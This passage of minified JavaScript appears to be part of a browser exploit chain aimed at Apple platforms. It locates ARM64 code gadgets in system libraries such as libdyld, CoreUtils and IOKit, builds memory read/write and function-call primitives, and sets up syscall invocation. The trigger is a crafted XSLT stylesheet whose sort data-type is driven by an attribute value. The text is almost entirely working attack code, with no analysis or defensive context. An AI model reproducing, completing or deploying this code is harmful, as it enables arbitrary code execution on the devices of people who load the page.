    this.oh = new ArrayBuffer(0x120), K.D(this.oh), this.eh = t.getBackingAddr(this.oh), globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.ejFVv9 ? (h = c.findGadgetNoPtr(["libdyld.dylib"], [(0xdac10100), (0xd65f03c0), (0xdac10900), (0xd65f03c0), (0xdac10d00), (0xd65f03c0), (0xdac10500), (0xd65f03c0)]), s = h.rwPrimBdgetAddr + 64) : (h = c.findGadgetNoPtr(["libdyld.dylib"], [(0xdac10102), 0x14000006, (0xdac10902), 0x14000004, (0xdac10d02), 0x14000002, (0xdac10502), (0xaa0203e0), (0xa8c17bfd), (0xd65f0fff)]), s = h.functionStart);
    const a = c.findGadgetNoPtr(["libdyld.dylib"], [(0xd65f03c0)]).rwPrimBdgetAddr,
      d = c.findGadgetNoPtr(["libReverseProxyDevice.dylib"], [(0xa9402003), (0xa9410801), (0xaa0803e0), (0xd61f087f)]).rwPrimBdgetAddr,
      b = c.findGadgetNoPtr(["/PrivateFrameworks/CoreUtils.framework/Versions/A/CoreUtils", "PrivateFrameworks/CoreUtils.framework/CoreUtils"], [(0xd503237f), (0xa9be4ff4), (0xa9017bfd), (0x910043fd), (0xaa0003f3), (0xf0162868), (0xf940e108), (0xd63f091f), (0xf9000260), (0xa9417bfd), (0xa8c24ff4), (0xd65f0fff)]),
      o = c.findGadgetNoPtr(["Backup.framework/Versions/A/Backup", "libomadm.dylib"], [(0xb00b3448), (0xf942d901), (0xb4000081), (0xb00b3448), (0xf942dd00), (0xd61f083f), (0xd65f03c0)]),
      e = {},
      y = i.qc(a),
      I = c.findGadgetInImages(["IOKit"], [(0xa9420808), (0xf9401801), (0xaa0803e0), (0xd61f085f)]).ptrValue,
      u = o.rwPrimBdgetAddr,
      g = o.branchTargets[0],
      r = o.branchTargets[1];
    t.withSwap((() => {
      e.Ch = i.qc(u)
    }), {
      Sr: r,
      Zt: y
    }, {
      Sr: g,
      Zt: y
    });
    const n = b.rwPrimBdgetAddr,
      C = b.branchTargets[0];
    t.withSwap((() => {
      e.Kh = i.qc(n)
    }), {
      Sr: C,
      Zt: y
    });
    const L = (c, s, h) => (t.writePtr(this.eh + 40, c), t.writePtr(this.eh + 32, s), t.writePtr(this.eh + 48, h), t.withSwap((() => {
      l.triggerXSL()
    }), {
      Sr: i.bh,
      Zt: e.Ch
    }, {
      Sr: r,
      Zt: K.Ptr64.ut(this.eh)
    }, {
      Sr: g,
      Zt: e.Kh
    }, {
      Sr: C,
      Zt: I
    }), t.readPair(this.eh));
    this.Lh = i.Uc(L, d), this.Ih = i.Uc(L, s);
    this.yh = (c, s, h, a) => (t.writePtr(this.eh + 0, c), t.writePtr(this.eh + 8, s), t.writePtr(this.eh + 16, h), t.writePtr(this.eh + 24, a), t.withSwap((() => {
      l.triggerXSL()
    }), {
      Sr: i.bh,
      Zt: e.Ch
    }, {
      Sr: r,
      Zt: K.Ptr64.ut(this.eh)
    }, {
      Sr: g,
      Zt: e.Kh
    }, {
      Sr: C,
      Zt: this.Lh
    }), t.readPair(this.eh)), this.uh = new ArrayBuffer(64), this.gh = t.getBackingAddr(this.uh), this.nh = K.Ptr64.ut(this.gh), K.D(this.uh), this.syscallNums = {
      sc: (0xff010000),
      oe: (0xff030000),
      ac: (0xff050000),
      cc: (0xff070000)
    };
    this.invokeSyscall = (i, t, c) => {
      const l = Math.abs(c.et >>> 16);
      return T.engine.memory.jr(this.gh, 0, i | l), this.yh(this.Ih, this.nh, c, t)
    }
  }
}
class XSLTrigger {
  constructor() {
    this.xslPayload = '<x:stylesheet xmlns:x="http://www.w3.org/1999/XSL/Transform" version="1.0"><x:template match="/"><x:for-each select="a/b"><x:sort select="c" data-type="{@foo}"/></x:for-each></x:template></x:stylesheet>', this.xmlDoc = (new DOMParser).parseFromString("<a><b><c>1</c></b><b><c>2</c></b></a>", "text/xml");
    const i = this.xslPayload,
      t = new XSLTProcessor,
      c = (new DOMParser).parseFromString(i, "text/xml"),
      l = this.xmlDoc;
    t.importStylesheet(c), this.triggerXSL = () => {
      t.transformToDocument(l)
    }
  }
  ah() {
    this.rwPrimCrmup(), this.triggerXSL()
  }
  Xh() {
    const i = this.xslPayload.replace("{@foo}", "foo"),
      t = new XSLTProcessor,
      c = (new DOMParser).parseFromString(i, "text/xml"),
      l = this.xmlDoc;
    t.importStylesheet(c), t.transformToDocument(l)
  }
  Th() {
    const i = new XSLTProcessor,
      t = (new DOMParser).parseFromString("<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"1.0\"></xsl:stylesheet>", "text/xml");
    i.importStylesheet(t), i.transformToDocument(t)
  }
}
return r.Mh = function() {
  return new ci
}, r;
